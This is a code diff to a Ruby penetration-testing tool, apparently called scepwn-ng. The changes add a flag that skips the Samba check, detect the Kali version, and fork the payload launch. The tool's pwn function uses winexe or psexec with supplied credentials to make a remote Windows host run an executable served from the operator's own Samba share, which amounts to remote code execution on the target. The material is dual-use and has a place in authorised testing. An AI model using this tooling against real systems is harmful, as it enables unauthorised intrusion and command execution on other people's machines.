@@ -73,6 +73,9 @@ parser = OptionParser.new do |opts|
 		puts opts
 		exit
 	end
+	opts.on( '-d', '--disable-check', "Disable the samba check (use this if you are using a distro other than Kali)" ) do |disable|
+		options[:disable] = "Disable"
+	end
 end
 
 
@@ -84,6 +87,7 @@ $target = options[:target]
 $user = options[:user]
 $port = options[:port]
 $service = options[:service]
+$disable = options[:disable]
 
 
 # Create the creds_array to hold all inputed credentials
@@ -119,8 +123,20 @@ if RUBY_PLATFORM =~ /linux/
 	DEF_INT = `route -n | grep 'UG ' | grep -v tun0 | awk '{print $8}'`
 	DEF_INT_IP = `ifconfig $DEF_INT | grep 'inet ' | awk '{print $2}' | cut -d':' -f 2 | cut -d'\n' -f 1`.tr("\n","")
 	#Need to add check for alternate package names on various OSes
-	$smbd_service = "samba"
-	$nmbd_service = "samba"
+	os = `cat /etc/lsb-release`
+	if os =~ /Kali/
+		if os =~ /1/
+			$smbd_service = "samba"
+			$nmbd_service = "samba"
+		elsif os =~ /2/
+			$smbd_service = "smbd"
+			$nmbd_service = "nmbd"
+		end
+	else
+		puts "scepwn was only designed to test services on Kali... I know, I know."
+		puts "setup the samba service manually and use the -d flag"
+		exit 1
+	end
 else
 	puts "[x]".red + "\t FATAL ERROR: scepwn-ng is currently only designed for linux"
 	exit
@@ -216,12 +232,12 @@ def samba_status(sce_share=nil)
 	nmbd_status = `service #{$nmbd_service} status`
 	if sce_share.nil?
 		puts "[+]\tChecking to see if Samba is running"
-		if smbd_status !~ /smbd is running/
+		if smbd_status !~ /smbd\ is\ running|active\ \(running\)/
 			puts "[x]".red + "\tThe Samba smbd service is not running"
 			puts "[*]".green + "\tStarting the samba smbd service"
 			smbd_start = `service #{$smbd_service} start`
 		end
-		if nmbd_status !~ /nmbd is running/
+		if nmbd_status !~ /nmbd\ is\ running|active\ \(running\)/
 			puts "[x]".red + "\tThe Samba nmbd service is not running"
 			puts "[*]".green + "\tStarting the samba nmbd service"
 			nmbd_start = `service #{$nmbd_service} start`
@@ -229,7 +245,7 @@ def samba_status(sce_share=nil)
 		#need to figure this shit out. How to reload values. Perhaps a seperate function to call. 
 		smbd_status = `service #{$smbd_service} status`
 		nmbd_status = `service #{$nmbd_service} status`
-		if smbd_status !~ /smbd is running/ or nmbd_status !~ /nmbd is running/
+		if smbd_status !~ /smbd\ is\ running|active\ \(running\)/ or nmbd_status !~ /nmbd\ is\ running|active\ \(running\)/
 			puts "[x]".red + "\tFATAL ERROR: The Samba service could not be started"
 			exit
 		else
@@ -242,7 +258,7 @@ def samba_status(sce_share=nil)
 		end
 		smbd_status = `service #{$smbd_service} status`
 		nmbd_status = `service #{$nmbd_service} status`
-		if smbd_status !~ /smbd is running/ or nmbd_status !~ /nmbd is running/
+		if smbd_status !~ /smbd\ is\ running|active\ \(running\)/ or nmbd_status !~ /nmbd\ is\ running|active\ \(running\)/
 			puts "[x]".red + "\tFATAL ERROR: The Samba service could not be started"
 			exit
 		else
@@ -270,18 +286,23 @@ def samba_check(sce_share=nil)
 		else
 			puts "[*]".green + "\t//localhost/#{share} is hot and serving #{SCE_NAME}, good to go"
 			$sce_share = share
-			break
+			return
 		end	
 	}
-	if $sce_share.nil?
-		print "[?]".blue + "\tWould you like to setup the samba share automagically?: (y/N) "
-		reply = gets.chomp
-		if reply =~ /[Yy]/ 
-			samba_setup
-		else
-			puts "[x]".red + "\tFATAL ERROR: #{SCE_NAME} was not found accessible on any samba share. Setup samba manually and start over..."
-			exit
+	if $disable.nil?
+		if $sce_share.nil?
+			print "[?]".blue + "\tWould you like to setup the samba share automagically?: (y/N) "
+			reply = gets.chomp
+			if reply =~ /[Yy]/ 
+				samba_setup
+			else
+				puts "[x]".red + "\tFATAL ERROR: #{SCE_NAME} was not found accessible on any samba share. Setup samba manually and start over..."
+				exit
+			end
 		end
+	else
+		puts "[x]".red + "\tFATAL ERROR: #{SCE_NAME} was not found accessible on any samba share. Setup samba manually and start over..."
+		exit
 	end
 end
 
@@ -353,12 +374,17 @@ def pwn
 	puts "    target:      #{$target}"
 	puts "    credentials: #{$user}"
 	puts "    port:        #{$port}"
-	if $service == "winexe"
-		exploit = system("#{WINEXE} --system --uninstall -U '#{$user}' //#{$target} 'cmd /c \\\\#{DEF_INT_IP}\\#{$sce_share}\\#{SCE_NAME} #{$def_opcode}'")
-	elsif $service == "psexec"
-		$psexec_creds = $user.split('%')
-		exploit = system("#{PSEXEC} #{$psexec_creds.first}:#{$psexec_creds.last}@#{$target} cmd 'cmd /c \\\\#{DEF_INT_IP}\\#{$sce_share}\\#{SCE_NAME} #{$def_opcode}'")
+	pid = fork do
+		if $service == "winexe"
+			exec "#{WINEXE} --system --uninstall -U '#{$user}' //#{$target} 'cmd /c \\\\#{DEF_INT_IP}\\#{$sce_share}\\#{SCE_NAME} #{$def_opcode}'"
+		elsif $service == "psexec"
+			$psexec_creds = $user.split("%")
+			exec "#{PSEXEC} '#{$psexec_creds.first}':#{$psexec_creds.last}@#{$target} cmd 'cmd /c \\\\#{DEF_INT_IP}\\#{$sce_share}\\#{SCE_NAME} #{$def_opcode}'"
+		end
 	end
+	Process.detach pid
+	sleep(2)
+	puts
 	print "[?]".green + "Pwn again (y/N):"
 	reply = gets.chomp
 	if reply =~ /[Yy]/ 
@@ -385,8 +411,14 @@ end
 
 
 # Main operation
-samba_status
+if $disable.nil?
+	samba_status
+else
+	puts "[+]\tSamba service check disabled - ensure samba is running"
+end
+
 samba_check
 generate_opcode
 generate_rc
 pwn
+	
